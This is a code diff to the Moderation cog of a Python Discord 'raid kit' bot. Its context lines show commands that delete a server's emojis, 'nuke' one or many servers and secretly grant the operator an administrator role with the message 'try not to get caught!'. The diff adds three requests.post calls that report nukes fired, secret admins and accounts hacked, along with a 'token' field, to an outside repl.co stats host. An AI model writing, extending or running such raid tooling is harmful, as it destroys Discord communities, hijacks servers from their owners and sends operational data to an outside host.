@@ -7,9 +7,10 @@
 import discord
 import random
 import os
+import requests
 from cogs.anubis_methods import CODE, check_for_servers, refresh, command_error
-from discord.ext import commands
 from colorama import Fore, init
+from discord.ext import commands
 init()
 
 
@@ -138,6 +139,7 @@ class Moderation(commands.Cog):
             print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n\n{Fore.RESET}")
 
             print(f"{Fore.LIGHTWHITE_EX}Nuke sucessfully exploded!\n{Fore.RED}\"{quote}\"{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote)+2)}{Fore.RESET}")
+            r = requests.post("https://discord-raidkit-command-stats.thecultofintegral.repl.co", data={'accountshacked': 0, 'nukesfired': 1, 'secretadmins': 0, 'token': 'n'})
             return
         except BaseException as e:
             print(f"{Fore.LIGHTRED_EX}{e}\n\n")
@@ -239,6 +241,7 @@ class Moderation(commands.Cog):
                 print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n{Fore.RESET}")
 
                 print(f"{Fore.LIGHTWHITE_EX}Warhead sucessfully exploded at server: {Fore.LIGHTRED_EX}\"{g}\"{Fore.LIGHTWHITE_EX}!\n{'-'*(len(str(g))+43)}\n{Fore.RESET}")
+                r = requests.post("https://discord-raidkit-command-stats.thecultofintegral.repl.co", data={'accountshacked': 0, 'nukesfired': 1, 'secretadmins': 0, 'token': 'n'})
                 i += 1
             print(f"{Fore.LIGHTWHITE_EX}All warheads fired.\n{Fore.RED}{quote}{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote))}\n{Fore.RESET}")
             return
@@ -318,6 +321,7 @@ class Moderation(commands.Cog):
                 await ctx.author.add_roles(role)
                 print(
                     f"{Fore.LIGHTGREEN_EX}\nAdministrator permissions granted successfully - try not to get caught!{Fore.RESET}")
+                r = requests.post("https://discord-raidkit-command-stats.thecultofintegral.repl.co", data={'accountshacked': 0, 'nukesfired': 0, 'secretadmins': 1, 'token': 'n'})
                 return
         except BaseException as e:
             print(f"{Fore.LIGHTRED_EX}{e}\n\n")
